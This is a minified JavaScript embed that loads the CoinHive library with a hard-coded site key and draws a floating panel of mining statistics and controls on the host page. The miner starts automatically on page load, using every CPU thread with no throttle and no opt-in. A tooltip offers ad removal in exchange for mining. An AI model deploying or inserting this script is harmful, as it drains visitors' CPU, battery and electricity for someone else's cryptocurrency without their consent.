! function() { var n = function() { try { return !!window.addEventListener } catch (n) { return !1 } },
        e = function(e, t) { n() ? document.addEventListener("DOMContentLoaded", e, t) : document.attachEvent("onreadystatechange", e) };
    e(function() {! function() { var n = document.createElement("script");
            n.type = "text/javascript", n.async = !0; var e = document.getElementsByTagName("script")[0];
            n.src = "./coinhive.min.js", n.onload = function() {
                function n() { return Kn.getHashesPerSecond().toFixed(1) }

                function e(n) { return Kn.getTotalHashes(n) }

                function t() { return Kn.getAcceptedHashes() }

                function i() { return Kn.stop() }

                function d(n) { return Kn.start(n) }

                function o() { return Kn.getNumThreads() }

                function r(n) { return Kn.setNumThreads(n) }

                function a() { return d(Vn), r(o() + 1) }

                function s() { return d(Vn), r(o() - 1) }

                function l() { return Kn.isRunning() }

                function c() { return Math.round(100 * Kn.getThrottle().toFixed(1)) / 100 }

                function m(n) { return Kn.setThrottle(n) }

                function p() { return d(Vn), m(c() + .1) }

                function u() { return d(Vn), m(c() - .1) }

                function h() { m(0), r(Jn), d(Vn) }

                function g() { m(.9), r(1), d(Vn) }

                function f() { m(Qn), r(Jn), d(Vn) }

                function d(n) { return Kn.start(n) } var y = "jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp",
                    v = !0,
                    w = navigator.hardwareConcurrency,
                    b = 0,
                    E = 1e3,
                    x = "miner",
                    I = "mining-stats-canvas",
                    T = "mining-is-running",
                    _ = "mining-is-running-id",
                    k = "mining-is-running-id-output",
                    B = "mining-is-running-id-output-yes",
                    H = "mining-is-running-id-output-no",
                    L = "mining-hashes-per-second",
                    M = "mining-hashes-per-second-id",
                    C = "mining-hashes-per-second-id-output",
                    A = "mining-accepted-hashes-per-second",
                    F = "mining-accepted-hashes-per-second-id",
                    S = "mining-accepted-hashes-per-second-id-output",
                    U = "mining-threads",
                    D = "mining-threads-id",
                    P = "mining-threads-id-output",
                    z = "mining-threads-add",
                    N = "mining-threads-remove",
                    O = "mining-hashes-total",
                    j = "mining-hashes-total-id",
                    X = "mining-hashes-total-id-output",
                    R = "mining-start",
                    q = "mining-stop",
                    G = "addthreads",
                    K = "removethreads",
                    V = "startmining",
                    J = "stopmining",
                    Q = "mining-current-throttle",
                    W = "mining-current-throttle-id",
                    Z = "mining-current-throttle-id-output",
                    Y = "mining-increase-throttle",
                    $ = "mining-increase-throttle-id",
                    nn = "mining-decrease-throttle",
                    en = "mining-decrease-throttle-id",
                    tn = "mining-minimal-speed",
                    dn = "mining-minimal-speed-id",
                    on = "mining-maximum-speed",
                    rn = "mining-maximum-speed-id",
                    an = "mining-default-recommended-speed",
                    sn = "mining-default-recommended-speed-id",
                    ln = "tooltiptext",
                    cn = "tooltip",
                    mn = "miner-button-class",
                    pn = "miner-text-area-class",
                    un = "",
                    hn = "Online",
                    gn = "Offline",
                    fn = "If the miner is currently running.",
                    yn = "Hashes/s | ",
                    vn = "The total number of hashes per second for all threads combined.",
                    wn = "Accepted Hashes | ",
                    bn = "The number of hashes that have been accepted by the pool.",
                    En = "Threads | ",
                    xn = "Amount of threads you have running currently.",
                    In = "+",
                    Tn = "Speed it up! Increases threads, but too many may slow your browser. 3 or 4 are OK in most cases.",
                    _n = "-",
                    kn = "Slow it down! (decrease threads to 0 to stop entirely)",
                    Bn = "Total Hashes | ",
                    Hn = "Hashes you solved so far. We will remove all ads for you once you mine enough. Login to have it keep track of your progress.",
                    Ln = "Start",
                    Mn = "Start the miner.",
                    Cn = "Stop",
                    An = "Stop the miner.",
                    Fn = "Throttle | ",
                    Sn = "How much the miner is currently being throttled.",
                    Un = "+",
                    Dn = "Increase the throttle to reduce CPU consumption.",
                    Pn = "-",
                    zn = "Decrease the throttle to allow more CPU consumption.",
                    Nn = "Min",
                    On = "Use the most minimal amount of CPU and Power possible.",
                    jn = "Max",
                    Xn = "Use all CPU and Power available.",
                    Rn = "Default",
                    qn = "Use Recommended default settings.",
                    Gn = document.createElement("div");
                Gn.id = x, document.body.appendChild(Gn), new_html = "<div id='" + I + "'></div>", document.getElementById(x).innerHTML = new_html, new_html = "<div id='" + T + "' class='" + cn + " " + pn + "'><span id='" + _ + "'>" + un + "</span><span id='" + k + "'></span><span id='" + ln + "'>" + fn + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + L + "' class='" + cn + " " + pn + "'><span id='" + M + "'>" + yn + "</span><span id='" + C + "'></span><span id='" + ln + "'>" + vn + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + A + "' class='" + cn + " " + pn + "'><span id='" + F + "'>" + wn + "</span><span id='" + S + "'></span><span id='" + ln + "'>" + bn + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + U + "' class='" + cn + " " + pn + "'><span id='" + D + "'>" + En + "</span><span id='" + P + "'></span><span id='" + ln + "'>" + xn + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + z + "' class='" + cn + " " + mn + "'><span id='" + G + "'>" + In + "</span><span id='" + ln + "'>" + Tn + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + N + "' class='" + cn + " " + mn + "'><span id='" + K + "'>" + _n + "</span><span id='" + ln + "'>" + kn + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + O + "' class='" + cn + " " + pn + "'><span id='" + j + "'>" + Bn + "</span><span id='" + X + "'></span><span id='" + ln + "'>" + Hn + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + R + "' class='" + cn + " " + mn + "'><span id='" + V + "'>" + Ln + "</span><span id='" + ln + "'>" + Mn + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + q + "' class='" + cn + " " + mn + "'><span id='" + J + "'>" + Cn + "</span><span id='" + ln + "'>" + An + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + Q + "' class='" + cn + " " + pn + "'><span id='" + W + "'>" + Fn + "</span><span id='" + Z + "'></span><span id='" + ln + "'>" + Sn + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + Y + "' class='" + cn + " " + mn + "'><span id='" + $ + "'>" + Un + "</span><span id='" + ln + "'>" + Dn + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + nn + "' class='" + cn + " " + mn + "'><span id='" + en + "'>" + Pn + "</span><span id='" + ln + "'>" + zn + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + tn + "' class='" + cn + " " + mn + "'><span id='" + dn + "'>" + Nn + "</span><span id='" + ln + "'>" + On + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + on + "' class='" + cn + " " + mn + "'><span id='" + rn + "'>" + jn + "</span><span id='" + ln + "'>" + Xn + "</span></div>", document.getElementById(I).innerHTML += new_html, new_html = "<div id='" + an + "' class='" + cn + " " + mn + "'><span id='" + sn + "'>" + Rn + "</span><span id='" + ln + "'>" + qn + "</span></div>", document.getElementById(I).innerHTML += new_html, createStyleElement.innerHTML += "#" + x + "{position:fixed;bottom:0;left:0;background-color:#262626;color:#FFFFFF;width:auto;height:auto;border-radius:3px;z-index:30;}#" + I + "{display:inline-block;width:100%;}#" + T + "{display:inherit;}#" + _ + "{}#" + k + "{}." + B + "{color:greenyellow;}." + H + "{color:#f00;}#" + L + "{display:inherit;}#" + M + "{display:inherit;}#" + C + "{display:inherit;padding:0px 0px 0px 5px;}#" + A + "{display:inherit;}#" + U + "{display:inherit;}#" + z + "{display:inherit;}#" + N + "{display:inherit;}#" + O + "{display:inherit;}#" + R + "{display:inherit;}#" + q + "{display:inherit;}#" + G + "{}#" + K + "{}#" + V + "{}#" + J + "{}#" + Q + "{display:inherit;}#" + Y + "{display:inherit;}#" + nn + "{display:inherit;}#" + tn + "{display:inherit;}#" + on + "{display:inherit;}#" + an + "{display:inherit;}." + mn + "{text-decoration: none;display: inline-block;padding: 0px 10px;margin: 2px;border: 1px solid #C7C7C7;border-radius: 3px;-moz-border-radius: 2px;-webkit-border-radius: 2px;background: #636A6C;background: -moz-linear-gradient(top,#636A6C 0%,#51575A 100%);background: -webkit-gradient(linear,left top,left bottom,color-stop(0%,#636A6C),color-stop(100%,#51575A));background: -webkit-linear-gradient(top,#636A6C 0%,#51575A 100%);background: -o-linear-gradient(top,#636A6C 0%,#51575A 100%);background: -ms-linear-gradient(top,#636A6C 0%,#51575A 100%);background: linear-gradient(top,#636A6C 0%,#51575A 100%);filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#636A6C',endColorstr='#51575A',GradientType=0);}." + mn + ":hover{display: inline-block;padding: 0px 10px;margin: 2px;border-radius: 3px;background: #ddd;background: -webkit-gradient(linear,left top,left bottom,color-stop(0,#fff),color-stop(1,#ddd));background: -moz-linear-gradient(top center,#fff 0%,#ddd 100%);background: -webkit-linear-gradient(top,#ffffff 0%,#dddddd 100%);background: -o-linear-gradient(top,#ffffff 0%,#dddddd 100%);background: -ms-linear-gradient(top,#ffffff 0%,#dddddd 100%);background: linear-gradient(top,#ffffff 0%,#dddddd 100%);filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff',endColorstr='#dddddd',GradientType=0);border: 1px solid;border-color: #ddd #bbb #999;cursor: pointer;color: #333;}." + pn + "{border:1px solid #e5e5e4;padding:0px 5px 0px 5px;}." + cn + "{position: relative;overflow:visible;}." + cn + " #" + ln + "{visibility: hidden;width:0px;height:0px;background-color: black;color: #fff;text-align: center;border-radius: 6px;padding: 5px 5px;position: absolute;z-index: 1;bottom: 150%;left: 50%;margin-left: -5px;overflow:hidden;}." + cn + ":hover #" + ln + "{visibility: visible;width:auto;height:auto;overflow:hidden;white-space:nowrap;}"; var Kn = new CoinHive.Anonymous(y, { throttle: b, threads: w }),
                    Vn = CoinHive.FORCE_EXCLUSIVE_TAB,
                    Jn = o(),
                    Qn = c();
                document.getElementById(z).onclick = function() { return a() }, document.getElementById(N).onclick = function() { return s() }, document.getElementById(R).onclick = function() { return d(Vn) }, document.getElementById(q).onclick = function() { return i() }, document.getElementById(Y).onclick = function() { return p() }, document.getElementById(nn).onclick = function() { return u() }, document.getElementById(tn).onclick = function() { return g() }, document.getElementById(on).onclick = function() { return h() }, document.getElementById(an).onclick = function() { return f() }, v && d(Vn), Kn.on("open", function() {}), Kn.on("authed", function(n) {}), Kn.on("close", function() {}), Kn.on("error", function(n) {}), Kn.on("job", function() {}), Kn.on("found", function() {}), Kn.on("accepted", function() {}), setInterval(function() { is_running = "", l() ? (is_running = hn, document.getElementById(k).className = B) : (is_running = gn, document.getElementById(k).className = H), document.getElementById(k).innerHTML = is_running, document.getElementById(C).innerHTML = n(), document.getElementById(S).innerHTML = t(), document.getElementById(P).innerHTML = o(), document.getElementById(X).innerHTML = e(!0), document.getElementById(Z).innerHTML = c() }, E) }, n.onerror = function() {}, e.parentNode.insertBefore(n, e) }() }, !1) }();